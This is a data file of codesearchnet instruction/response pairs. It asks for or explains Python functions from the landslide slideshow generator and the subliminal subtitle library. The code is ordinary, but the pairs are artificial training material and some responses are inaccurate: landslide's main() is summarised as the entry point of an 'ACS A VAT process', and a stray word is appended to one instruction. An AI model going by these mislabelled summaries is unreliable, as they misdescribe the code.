{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds a new entry to the current presentation Table of Contents.", "response": "def add_toc_entry(self, title, level, slide_number):\n        \"\"\" Adds a new entry to current presentation Table of Contents.\n        \"\"\"\n        self.__toc.append({'title': title, 'number': slide_number,\n                           'level': level})"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsmart getter for Table of Content list.", "response": "def toc(self):\n        \"\"\" Smart getter for Table of Content list.\n        \"\"\"\n        toc = []\n        stack = [toc]\n        for entry in self.__toc:\n            entry['sub'] = []\n            while entry['level'] < len(stack):\n                stack.pop()\n            while entry['level'] > len(stack):\n                stack.append(stack[-1][-1]['sub'])\n            stack[-1].append(entry)\n        return toc"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef execute(self):\n        if self.direct:\n            if self.file_type == 'pdf':\n                raise IOError(u\"Direct output mode is not available for PDF \"\n                               \"export\")\n            else:\n                print(self.render().encode(self.encoding))\n        else:\n            self.write_and_log()\n\n            if self.watch:\n                from landslide.watcher import watch\n\n                self.log(u\"Watching %s\\n\" % self.watch_dir)\n\n                watch(self.watch_dir, self.write_and_log)", "response": "Execute this generator regarding its current configuration."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nretrieves the Jinja2 template file path.", "response": "def get_template_file(self):\n        \"\"\" Retrieves Jinja2 template file path.\n        \"\"\"\n        if os.path.exists(os.path.join(self.theme_dir, 'base.html')):\n            return os.path.join(self.theme_dir, 'base.html')\n        default_dir = os.path.join(THEMES_DIR, 'default')\n        if not os.path.exists(os.path.join(default_dir, 'base.html')):\n            raise IOError(u\"Cannot find base.html in default theme\")\n        return os.path.join(default_dir, 'base.html')"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fetch_contents(self, source):\n        slides = []\n\n        if type(source) is list:\n            for entry in source:\n                slides.extend(self.fetch_contents(entry))\n        elif os.path.isdir(source):\n            self.log(u\"Entering %s\" % source)\n            entries = os.listdir(source)\n            entries.sort()\n            for entry in entries:\n                slides.extend(self.fetch_contents(os.path.join(source, entry)))\n        else:\n            try:\n                parser = Parser(os.path.splitext(source)[1], self.encoding,\n                    self.extensions)\n            except NotImplementedError:\n                return slides\n\n            self.log(u\"Adding   %s (%s)\" % (source, parser.format))\n\n            try:\n                with codecs.open(source, encoding=self.encoding) as file:\n                    file_contents = file.read()\n            except UnicodeDecodeError:\n                self.log(u\"Unable to decode source %s: skipping\" % source,\n                         'warning')\n            else:\n                inner_slides = re.split(r'<hr.+>', parser.parse(file_contents))\n                for inner_slide in inner_slides:\n                    slides.append(self.get_slide_vars(inner_slide, source))\n\n        if not slides:\n            self.log(u\"Exiting  %s: no contents found\" % source, 'notice')\n\n        return slides", "response": "Recursively fetches Markdown contents from a single file or directory containing itself Markdown files."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_theme_dir(self, theme, copy_theme=False):\n        if os.path.exists(theme):\n            self.theme_dir = theme\n        elif os.path.exists(os.path.join(THEMES_DIR, theme)):\n            self.theme_dir = os.path.join(THEMES_DIR, theme)\n        else:\n            raise IOError(u\"Theme %s not found or invalid\" % theme)\n        target_theme_dir = os.path.join(os.getcwd(), 'theme')\n        if copy_theme or os.path.exists(target_theme_dir):\n            self.log(u'Copying %s theme directory to %s'\n                     % (theme, target_theme_dir))\n            if not os.path.exists(target_theme_dir):\n                try:\n                    shutil.copytree(self.theme_dir, target_theme_dir)\n                except Exception as e:\n                    self.log(u\"Skipped copy of theme folder: %s\" % e)\n                    pass\n            self.theme_dir = target_theme_dir\n        return self.theme_dir", "response": "Find the theme directory path from its name."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching and returns stylesheet file path or contents for both print and screen contexts.", "response": "def get_css(self):\n        \"\"\" Fetches and returns stylesheet file path or contents, for both\n            print and screen contexts, depending if we want a standalone\n            presentation or not.\n        \"\"\"\n        css = {}\n\n        print_css = os.path.join(self.theme_dir, 'css', 'print.css')\n\n        if not os.path.exists(print_css):\n            # Fall back to default theme\n            print_css = os.path.join(THEMES_DIR, 'default', 'css', 'print.css')\n\n            if not os.path.exists(print_css):\n                raise IOError(u\"Cannot find css/print.css in default theme\")\n\n        with codecs.open(print_css, encoding=self.encoding) as css_file:\n            css['print'] = {\n                'path_url': utils.get_path_url(print_css, self.relative),\n                'contents': css_file.read(),\n            }\n\n        screen_css = os.path.join(self.theme_dir, 'css', 'screen.css')\n\n        if (os.path.exists(screen_css)):\n            with codecs.open(screen_css, encoding=self.encoding) as css_file:\n                css['screen'] = {\n                    'path_url': utils.get_path_url(screen_css, self.relative),\n                    'contents': css_file.read(),\n                }\n        else:\n            self.log(u\"No screen stylesheet provided in current theme\",\n                      'warning')\n\n        return css"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_js(self):\n        js_file = os.path.join(self.theme_dir, 'js', 'slides.js')\n\n        if not os.path.exists(js_file):\n            js_file = os.path.join(THEMES_DIR, 'default', 'js', 'slides.js')\n\n            if not os.path.exists(js_file):\n                raise IOError(u\"Cannot find slides.js in default theme\")\n        with codecs.open(js_file, encoding=self.encoding) as js_file_obj:\n            return {\n                'path_url': utils.get_path_url(js_file, self.relative),\n                'contents': js_file_obj.read(),\n            }", "response": "Fetches and returns javascript file path or contents depending if there is a standalone presentation or not."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_slide_vars(self, slide_src, source=None):\n        presenter_notes = None\n\n        find = re.search(r'<h\\d[^>]*>presenter notes</h\\d>', slide_src,\n                         re.DOTALL | re.UNICODE | re.IGNORECASE)\n\n        if find:\n            if self.presenter_notes:\n                presenter_notes = slide_src[find.end():].strip()\n\n            slide_src = slide_src[:find.start()]\n\n        find = re.search(r'(<h(\\d+?).*?>(.+?)</h\\d>)\\s?(.+)?', slide_src,\n                         re.DOTALL | re.UNICODE)\n\n        if not find:\n            header = level = title = None\n            content = slide_src.strip()\n        else:\n            header = find.group(1)\n            level = int(find.group(2))\n            title = find.group(3)\n            content = find.group(4).strip() if find.group(4) else find.group(4)\n\n        slide_classes = []\n\n        if header:\n            header, _ = self.process_macros(header, source)\n\n        if content:\n            content, slide_classes = self.process_macros(content, source)\n\n        source_dict = {}\n\n        if source:\n            source_dict = {'rel_path': source,\n                           'abs_path': os.path.abspath(source)}\n\n        if header or content:\n            return {'header': header, 'title': title, 'level': level,\n                    'content': content, 'classes': slide_classes,\n                    'source': source_dict, 'presenter_notes': presenter_notes,\n                    'math_output': self.math_output}", "response": "Computes a single slide template vars from its html source code."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncompute the template vars from the slides html source code.", "response": "def get_template_vars(self, slides):\n        \"\"\" Computes template vars from slides html source code.\n        \"\"\"\n        try:\n            head_title = slides[0]['title']\n        except (IndexError, TypeError):\n            head_title = \"Untitled Presentation\"\n\n        for slide_index, slide_vars in enumerate(slides):\n            if not slide_vars:\n                continue\n            self.num_slides += 1\n            slide_number = slide_vars['number'] = self.num_slides\n            if slide_vars['level'] and slide_vars['level'] <= TOC_MAX_LEVEL:\n                self.add_toc_entry(slide_vars['title'], slide_vars['level'],\n                                   slide_number)\n            else:\n                # Put something in the TOC even if it doesn't have a title or level\n                self.add_toc_entry(u\"-\", 1, slide_number)\n\n        return {'head_title': head_title, 'num_slides': str(self.num_slides),\n                'slides': slides, 'toc': self.toc, 'embed': self.embed,\n                'css': self.get_css(), 'js': self.get_js(),\n                'user_css': self.user_css, 'user_js': self.user_js,\n                'math_output': self.math_output}"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef log(self, message, type='notice'):\n        if self.logger and not callable(self.logger):\n            raise ValueError(u\"Invalid logger set, must be a callable\")\n        if self.verbose and self.logger:\n            self.logger(message, type)", "response": "Logs a message (eventually, override to do something more clever)."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses a landslide configuration file and returns a normalized version of the configuration file.", "response": "def parse_config(self, config_source):\n        \"\"\" Parses a landslide configuration file and returns a normalized\n            python dict.\n        \"\"\"\n        self.log(u\"Config   %s\" % config_source)\n        try:\n            raw_config = configparser.RawConfigParser()\n            raw_config.read(config_source)\n        except Exception as e:\n            raise RuntimeError(u\"Invalid configuration file: %s\" % e)\n        config = {}\n        config['source'] = raw_config.get('landslide', 'source')\\\n            .replace('\\r', '').split('\\n')\n        if raw_config.has_option('landslide', 'theme'):\n            config['theme'] = raw_config.get('landslide', 'theme')\n            self.log(u\"Using    configured theme %s\" % config['theme'])\n        if raw_config.has_option('landslide', 'destination'):\n            config['destination'] = raw_config.get('landslide', 'destination')\n        if raw_config.has_option('landslide', 'linenos'):\n            config['linenos'] = raw_config.get('landslide', 'linenos')\n        for boolopt in ('embed', 'relative', 'copy_theme'):\n            if raw_config.has_option('landslide', boolopt):\n                config[boolopt] = raw_config.getboolean('landslide', boolopt)\n        if raw_config.has_option('landslide', 'extensions'):\n            config['extensions'] = \",\".join(raw_config.get('landslide', 'extensions')\\\n                .replace('\\r', '').split('\\n'))\n        if raw_config.has_option('landslide', 'css'):\n            config['css'] = raw_config.get('landslide', 'css')\\\n                .replace('\\r', '').split('\\n')\n        if raw_config.has_option('landslide', 'js'):\n            config['js'] = raw_config.get('landslide', 'js')\\\n                .replace('\\r', '').split('\\n')\n        return config"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef process_macros(self, content, source=None):\n        macro_options = {'relative': self.relative, 'linenos': self.linenos}\n        classes = []\n        for macro_class in self.macros:\n            try:\n                macro = macro_class(logger=self.logger, embed=self.embed,\n                    options=macro_options)\n                content, add_classes = macro.process(content, source)\n                if add_classes:\n                    classes += add_classes\n            except Exception as e:\n                self.log(u\"%s processing failed in %s: %s\"\n                         % (macro, source, e))\n        return content, classes", "response": "Processes all macros and returns the content and classes."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef register_macro(self, *macros):\n        for m in macros:\n            if inspect.isclass(m) and issubclass(m, macro_module.Macro):\n                self.macros.append(m)\n            else:\n                raise TypeError(\"Coundn't register macro; a macro must inherit\"\n                                \" from macro.Macro\")", "response": "Registers a macro class passed a method arguments."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef render(self):\n        with codecs.open(self.template_file, encoding=self.encoding) as template_src:\n            template = jinja2.Template(template_src.read())\n        slides = self.fetch_contents(self.source)\n        context = self.get_template_vars(slides)\n\n        html = template.render(context)\n\n        if self.embed:\n            images = re.findall(r'url\\([\"\\']?(.*?\\.(?:jpe?g|gif|png|svg)[\\'\"]?)\\)',\n                html, re.DOTALL | re.UNICODE)\n\n            for img_url in images:\n                img_url = img_url.replace('\"', '').replace(\"'\", '')\n                if self.theme_dir:\n                    source = os.path.join(self.theme_dir, 'css')\n                else:\n                    source = os.path.join(THEMES_DIR, self.theme, 'css')\n\n                encoded_url = utils.encode_image_from_url(img_url, source)\n                if encoded_url:\n                    html = html.replace(img_url, encoded_url, 1)\n                    self.log(\"Embedded theme image %s from theme directory %s\" % (img_url, source))\n                else:\n                    # Missing file in theme directory. Try user_css folders\n                    found = False\n                    for css_entry in context['user_css']:\n                        directory = os.path.dirname(css_entry['path_url'])\n                        if not directory:\n                            directory = \".\"\n\n                        encoded_url = utils.encode_image_from_url(img_url, directory)\n\n                        if encoded_url:\n                            found = True\n                            html = html.replace(img_url, encoded_url, 1)\n                            self.log(\"Embedded theme image %s from directory %s\" % (img_url, directory))\n\n                    if not found:\n                        # Missing image file, etc...\n                        self.log(u\"Failed to embed theme image %s\" % img_url)\n\n        return html", "response": "Render the template file and return the generated html code."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nwriting generated presentation code into the destination file.", "response": "def write(self):\n        \"\"\" Writes generated presentation code into the destination file.\n        \"\"\"\n        html = self.render()\n\n        if self.file_type == 'pdf':\n            self.write_pdf(html)\n        else:\n            with codecs.open(self.destination_file, 'w',\n                             encoding='utf_8') as outfile:\n                outfile.write(html)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef write_pdf(self, html):\n        try:\n            f = tempfile.NamedTemporaryFile(delete=False, suffix='.html')\n            f.write(html.encode('utf_8', 'xmlcharrefreplace'))\n            f.close()\n        except Exception:\n            raise IOError(u\"Unable to create temporary file, aborting\")\n\n        dummy_fh = open(os.path.devnull, 'w')\n\n        try:\n            command = [\"prince\", f.name, \"-o\", self.destination_file]\n\n            Popen(command, stderr=dummy_fh).communicate()\n        except Exception:\n            raise EnvironmentError(u\"Unable to generate PDF file using \"\n                                    \"prince. Is it installed and available?\")\n        finally:\n            dummy_fh.close()", "response": "Writes a PDF file from the command line using Prince."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing the command line options for the landslide s command line interface.", "response": "def _parse_options():\n    \"\"\"Parses landslide's command line options\"\"\"\n\n    parser = OptionParser(\n        usage=\"%prog [options] input.md ...\",\n        description=\"Generates an HTML5 or PDF \"\n                    \"slideshow from Markdown or other formats\",\n        epilog=\"Note: PDF export requires the `prince` program: \"\n               \"http://princexml.com/\",\n        version=\"%prog \" + __version__)\n\n    parser.add_option(\n        \"-c\", \"--copy-theme\",\n        action=\"store_true\",\n        dest=\"copy_theme\",\n        help=\"Copy theme directory into current presentation source directory\",\n        default=False)\n\n    parser.add_option(\n        \"-b\", \"--debug\",\n        action=\"store_true\",\n        dest=\"debug\",\n        help=\"Will display any exception trace to stdout\",\n        default=False)\n\n    parser.add_option(\n        \"-d\", \"--destination\",\n        dest=\"destination_file\",\n        help=\"The path to the to the destination file: .html or \"\n             \".pdf extensions allowed (default: presentation.html)\",\n        metavar=\"FILE\",\n        default=\"presentation.html\")\n\n    parser.add_option(\n        \"-e\", \"--encoding\",\n        dest=\"encoding\",\n        help=\"The encoding of your files (defaults to utf8)\",\n        metavar=\"ENCODING\",\n        default=\"utf8\")\n\n    parser.add_option(\n        \"-i\", \"--embed\",\n        action=\"store_true\",\n        dest=\"embed\",\n        help=\"Embed stylesheet and javascript contents, \"\n             \"base64-encoded images in presentation to make a \"\n             \"standalone document\",\n        default=False)\n\n    parser.add_option(\n        \"-l\", \"--linenos\",\n        type=\"choice\",\n        choices=generator.VALID_LINENOS,\n        dest=\"linenos\",\n        help=\"How to output linenos in source code. Three options availables: \"\n        \"no (no line numbers); \"\n        \"inline (inside <pre> tag); \"\n        \"table (lines numbers in another cell, copy-paste friendly)\",\n        default=\"inline\",\n    )\n\n    parser.add_option(\n        \"-o\", \"--direct-output\",\n        action=\"store_true\",\n        dest=\"direct\",\n        help=\"Prints the generated HTML code to stdout; won't work with PDF \"\n             \"export\",\n        default=False)\n\n    parser.add_option(\n        \"-P\", \"--no-presenter-notes\",\n        action=\"store_false\",\n        dest=\"presenter_notes\",\n        help=\"Don't include presenter notes in the output\",\n        default=True)\n\n    parser.add_option(\n        \"-q\", \"--quiet\",\n        action=\"store_false\",\n        dest=\"verbose\",\n        help=\"Won't write anything to stdout (silent mode)\",\n        default=False)\n\n    parser.add_option(\n        \"-r\", \"--relative\",\n        action=\"store_true\",\n        dest=\"relative\",\n        help=\"Make your presentation asset links relative to current pwd; \"\n             \"This may be useful if you intend to publish your html \"\n             \"presentation online.\",\n        default=False,\n    )\n\n    parser.add_option(\n        \"-t\", \"--theme\",\n        dest=\"theme\",\n        help=\"A theme name, or path to a landlside theme directory\",\n        default='default')\n\n    parser.add_option(\n        \"-v\", \"--verbose\",\n        action=\"store_true\",\n        dest=\"verbose\",\n        help=\"Write informational messages to stdout (enabled by default)\",\n        default=True)\n\n    parser.add_option(\n        \"-x\", \"--extensions\",\n        dest=\"extensions\",\n        help=\"Comma-separated list of extensions for Markdown\",\n        default='',\n    )\n\n    parser.add_option(\n        \"-w\", \"--watch\",\n        action=\"store_true\",\n        dest=\"watch\",\n        help=\"Watch source directory for changes and regenerate slides\",\n        default=False\n    )\n\n    parser.add_option(\n        \"-m\", \"--math-output\",\n        action=\"store_true\",\n        dest=\"math_output\",\n        help=\"Enable mathematical output using MathJax\",\n        default=False\n    )\n\n    (options, args) = parser.parse_args()\n\n    if not args:\n        parser.print_help()\n        sys.exit(1)\n\n    return options, args[0]"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nlog a message to stdout and stderr", "response": "def log(message, type):\n    \"\"\"Log notices to stdout and errors to stderr\"\"\"\n\n    (sys.stdout if type == 'notice' else sys.stderr).write(message + \"\\n\")"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef run(input_file, options):\n\n    options.logger = log\n    generator.Generator(input_file, **options.__dict__).execute()", "response": "Runs the Generator using parsed options."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef main():\n\n    options, input_file = _parse_options()\n\n    if (options.debug):\n        run(input_file, options)\n    else:\n        try:\n            run(input_file, options)\n        except Exception as e:\n            sys.stderr.write(\"Error: %s\\n\" % e)\n            sys.exit(1)", "response": "Main entry point of the ACS A VAT process."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrefines a video by searching OMDb API for series and year.", "response": "def refine(video, **kwargs):\n    \"\"\"Refine a video by searching `OMDb API <http://omdbapi.com/>`_.\n\n    Several :class:`~subliminal.video.Episode` attributes can be found:\n\n      * :attr:`~subliminal.video.Episode.series`\n      * :attr:`~subliminal.video.Episode.year`\n      * :attr:`~subliminal.video.Episode.series_imdb_id`\n\n    Similarly, for a :class:`~subliminal.video.Movie`:\n\n      * :attr:`~subliminal.video.Movie.title`\n      * :attr:`~subliminal.video.Movie.year`\n      * :attr:`~subliminal.video.Video.imdb_id`\n\n    \"\"\"\n    if isinstance(video, Episode):\n        # exit if the information is complete\n        if video.series_imdb_id:\n            logger.debug('No need to search')\n            return\n\n        # search the series\n        results = search(video.series, 'series', video.year)\n        if not results:\n            logger.warning('No results for series')\n            return\n        logger.debug('Found %d results', len(results))\n\n        # filter the results\n        results = [r for r in results if sanitize(r['Title']) == sanitize(video.series)]\n        if not results:\n            logger.warning('No matching series found')\n            return\n\n        # process the results\n        found = False\n        for result in sorted(results, key=operator.itemgetter('Year')):\n            if video.original_series and video.year is None:\n                logger.debug('Found result for original series without year')\n                found = True\n                break\n            if video.year == int(result['Year'].split(u'\\u2013')[0]):\n                logger.debug('Found result with matching year')\n                found = True\n                break\n\n        if not found:\n            logger.warning('No matching series found')\n            return\n\n        # add series information\n        logger.debug('Found series %r', result)\n        video.series = result['Title']\n        video.year = int(result['Year'].split(u'\\u2013')[0])\n        video.series_imdb_id = result['imdbID']\n\n    elif isinstance(video, Movie):\n        # exit if the information is complete\n        if video.imdb_id:\n            return\n\n        # search the movie\n        results = search(video.title, 'movie', video.year)\n        if not results:\n            logger.warning('No results')\n            return\n        logger.debug('Found %d results', len(results))\n\n        # filter the results\n        results = [r for r in results if sanitize(r['Title']) == sanitize(video.title)]\n        if not results:\n            logger.warning('No matching movie found')\n            return\n\n        # process the results\n        found = False\n        for result in results:\n            if video.year is None:\n                logger.debug('Found result for movie without year')\n                found = True\n                break\n            if video.year == int(result['Year']):\n                logger.debug('Found result with matching year')\n                found = True\n                break\n\n        if not found:\n            logger.warning('No matching movie found')\n            return\n\n        # add movie information\n        logger.debug('Found movie %r', result)\n        video.title = result['Title']\n        video.year = int(result['Year'].split(u'\\u2013')[0])\n        video.imdb_id = result['imdbID']"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting a second hash based on napiprojekt s hash.", "response": "def get_subhash(hash):\n    \"\"\"Get a second hash based on napiprojekt's hash.\n\n    :param str hash: napiprojekt's hash.\n    :return: the subhash.\n    :rtype: str\n\n    \"\"\"\n    idx = [0xe, 0x3, 0x6, 0x8, 0x2]\n    mul = [2, 2, 5, 4, 3]\n    add = [0, 0xd, 0x10, 0xb, 0x5]\n\n    b = []\n    for i in range(len(idx)):\n        a = add[i]\n        m = mul[i]\n        i = idx[i]\n        t = a + int(hash[i], 16)\n        v = int(hash[t:t + 2], 16)\n        b.append(('%x' % (v * m))[-1])\n\n    return ''.join(b)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_subtitle_path(video_path, language=None, extension='.srt'):\n    subtitle_root = os.path.splitext(video_path)[0]\n\n    if language:\n        subtitle_root += '.' + str(language)\n\n    return subtitle_root + extension", "response": "Get the path of the subtitle using the video_path and language."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef guess_matches(video, guess, partial=False):\n    matches = set()\n    if isinstance(video, Episode):\n        # series\n        if video.series and 'title' in guess and sanitize(guess['title']) == sanitize(video.series):\n            matches.add('series')\n        # title\n        if video.title and 'episode_title' in guess and sanitize(guess['episode_title']) == sanitize(video.title):\n            matches.add('title')\n        # season\n        if video.season and 'season' in guess and guess['season'] == video.season:\n            matches.add('season')\n        # episode\n        if video.episode and 'episode' in guess and guess['episode'] == video.episode:\n            matches.add('episode')\n        # year\n        if video.year and 'year' in guess and guess['year'] == video.year:\n            matches.add('year')\n        # count \"no year\" as an information\n        if not partial and video.original_series and 'year' not in guess:\n            matches.add('year')\n    elif isinstance(video, Movie):\n        # year\n        if video.year and 'year' in guess and guess['year'] == video.year:\n            matches.add('year')\n        # title\n        if video.title and 'title' in guess and sanitize(guess['title']) == sanitize(video.title):\n            matches.add('title')\n    # release_group\n    if (video.release_group and 'release_group' in guess and\n            sanitize_release_group(guess['release_group']) in\n            get_equivalent_release_groups(sanitize_release_group(video.release_group))):\n        matches.add('release_group')\n    # resolution\n    if video.resolution and 'screen_size' in guess and guess['screen_size'] == video.resolution:\n        matches.add('resolution')\n    # format\n    if video.format and 'format' in guess and guess['format'].lower() == video.format.lower():\n        matches.add('format')\n    # video_codec\n    if video.video_codec and 'video_codec' in guess and guess['video_codec'] == video.video_codec:\n        matches.add('video_codec')\n    # audio_codec\n    if video.audio_codec and 'audio_codec' in guess and guess['audio_codec'] == video.audio_codec:\n        matches.add('audio_codec')\n\n    return matches", "response": "Get matches between a video and a guess."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef text(self):\n        if not self.content:\n            return\n\n        if self.encoding:\n            return self.content.decode(self.encoding, errors='replace')\n\n        return self.content.decode(self.guess_encoding(), errors='replace')", "response": "Content as string\n\n        If :attr:`encoding` is None, the encoding is guessed with :meth:`guess_encoding`"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef is_valid(self):\n        if not self.text:\n            return False\n\n        try:\n            pysrt.from_string(self.text, error_handling=pysrt.ERROR_RAISE)\n        except pysrt.Error as e:\n            if e.args[0] < 80:\n                return False\n\n        return True", "response": "Check if a : attr : text is a valid SubRip format."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef guess_encoding(self):\n        logger.info('Guessing encoding for language %s', self.language)\n\n        # always try utf-8 first\n        encodings = ['utf-8']\n\n        # add language-specific encodings\n        if self.language.alpha3 == 'zho':\n            encodings.extend(['gb18030', 'big5'])\n        elif self.language.alpha3 == 'jpn':\n            encodings.append('shift-jis')\n        elif self.language.alpha3 == 'ara':\n            encodings.append('windows-1256')\n        elif self.language.alpha3 == 'heb':\n            encodings.append('windows-1255')\n        elif self.language.alpha3 == 'tur':\n            encodings.extend(['iso-8859-9', 'windows-1254'])\n        elif self.language.alpha3 == 'pol':\n            # Eastern European Group 1\n            encodings.extend(['windows-1250'])\n        elif self.language.alpha3 == 'bul':\n            # Eastern European Group 2\n            encodings.extend(['windows-1251'])\n        else:\n            # Western European (windows-1252)\n            encodings.append('latin-1')\n\n        # try to decode\n        logger.debug('Trying encodings %r', encodings)\n        for encoding in encodings:\n            try:\n                self.content.decode(encoding)\n            except UnicodeDecodeError:\n                pass\n            else:\n                logger.info('Guessed encoding %s', encoding)\n                return encoding\n\n        logger.warning('Could not guess encoding from language')\n\n        # fallback on chardet\n        encoding = chardet.detect(self.content)['encoding']\n        logger.info('Chardet found encoding %s', encoding)\n\n        return encoding", "response": "Guess encoding using the language."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _search_url_titles(self, title):\n        # make the search\n        logger.info('Searching title name for %r', title)\n        r = self.session.get(self.server_url + 'subtitle/search/', params={'q': title}, timeout=10)\n        r.raise_for_status()\n\n        # check for redirections\n        if r.history and all([h.status_code == 302 for h in r.history]):\n            logger.debug('Redirected to the subtitles page')\n            links = [r.url]\n        else:\n            # get the suggestions (if needed)\n            soup = ParserBeautifulSoup(r.content, ['lxml', 'html.parser'])\n            links = [link.attrs['href'] for link in soup.select('#processes div.generalWindowTop a')]\n            logger.debug('Found %d suggestions', len(links))\n\n        url_titles = defaultdict(list)\n        for link in links:\n            parts = link.split('/')\n            url_titles[parts[-3]].append(parts[-2])\n\n        return url_titles", "response": "Search the URL titles by kind for the given title."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef age(self):\n        if self.exists:\n            return datetime.utcnow() - datetime.utcfromtimestamp(os.path.getmtime(self.name))\n\n        return timedelta()", "response": "Age of the video"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates an episode or movie object from the given name based on the guess.", "response": "def fromguess(cls, name, guess):\n        \"\"\"Create an :class:`Episode` or a :class:`Movie` with the given `name` based on the `guess`.\n\n        :param str name: name of the video.\n        :param dict guess: guessed data.\n        :raise: :class:`ValueError` if the `type` of the `guess` is invalid\n\n        \"\"\"\n        if guess['type'] == 'episode':\n            return Episode.fromguess(name, guess)\n\n        if guess['type'] == 'movie':\n            return Movie.fromguess(name, guess)\n\n        raise ValueError('The guess must be an episode or a movie guess')"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nregisters an extension with the registry.", "response": "def register(self, entry_point):\n        \"\"\"Register an extension\n\n        :param str entry_point: extension to register (entry point syntax).\n        :raise: ValueError if already registered.\n\n        \"\"\"\n        if entry_point in self.registered_extensions:\n            raise ValueError('Extension already registered')\n\n        ep = EntryPoint.parse(entry_point)\n        if ep.name in self.names():\n            raise ValueError('An extension with the same name already exist')\n\n        ext = self._load_one_plugin(ep, False, (), {}, False)\n        self.extensions.append(ext)\n        if self._extensions_by_name is not None:\n            self._extensions_by_name[ext.name] = ext\n        self.registered_extensions.insert(0, entry_point)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef hash_opensubtitles(video_path):\n    bytesize = struct.calcsize(b'<q')\n    with open(video_path, 'rb') as f:\n        filesize = os.path.getsize(video_path)\n        filehash = filesize\n        if filesize < 65536 * 2:\n            return\n        for _ in range(65536 // bytesize):\n            filebuffer = f.read(bytesize)\n            (l_value,) = struct.unpack(b'<q', filebuffer)\n            filehash += l_value\n            filehash &= 0xFFFFFFFFFFFFFFFF  # to remain as 64bit number\n        f.seek(max(0, filesize - 65536), 0)\n        for _ in range(65536 // bytesize):\n            filebuffer = f.read(bytesize)\n            (l_value,) = struct.unpack(b'<q', filebuffer)\n            filehash += l_value\n            filehash &= 0xFFFFFFFFFFFFFFFF\n    returnedhash = '%016x' % filehash\n\n    return returnedhash", "response": "Compute a hash using OpenSubtitles algorithm."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing a hash using TheSubDB s algorithm.", "response": "def hash_thesubdb(video_path):\n    \"\"\"Compute a hash using TheSubDB's algorithm.\n\n    :param str video_path: path of the video.\n    :return: the hash.\n    :rtype: str\n\n    \"\"\"\n    readsize = 64 * 1024\n    if os.path.getsize(video_path) < readsize:\n        return\n    with open(video_path, 'rb') as f:\n        data = f.read(readsize)\n        f.seek(-readsize, os.SEEK_END)\n        data += f.read(readsize)\n\n    return hashlib.md5(data).hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncompute a hash using NapiProjekt s algorithm.", "response": "def hash_napiprojekt(video_path):\n    \"\"\"Compute a hash using NapiProjekt's algorithm.\n\n    :param str video_path: path of the video.\n    :return: the hash.\n    :rtype: str\n\n    \"\"\"\n    readsize = 1024 * 1024 * 10\n    with open(video_path, 'rb') as f:\n        data = f.read(readsize)\n    return hashlib.md5(data).hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncomputes a hash using Shooter s algorithm Taxonomy", "response": "def hash_shooter(video_path):\n    \"\"\"Compute a hash using Shooter's algorithm\n\n    :param string video_path: path of the video\n    :return: the hash\n    :rtype: string\n\n    \"\"\"\n    filesize = os.path.getsize(video_path)\n    readsize = 4096\n    if os.path.getsize(video_path) < readsize * 2:\n        return None\n    offsets = (readsize, filesize // 3 * 2, filesize // 3, filesize - readsize * 2)\n    filehash = []\n    with open(video_path, 'rb') as f:\n        for offset in offsets:\n            f.seek(offset)\n            filehash.append(hashlib.md5(f.read(readsize)).hexdigest())\n    return ';'.join(filehash)"}
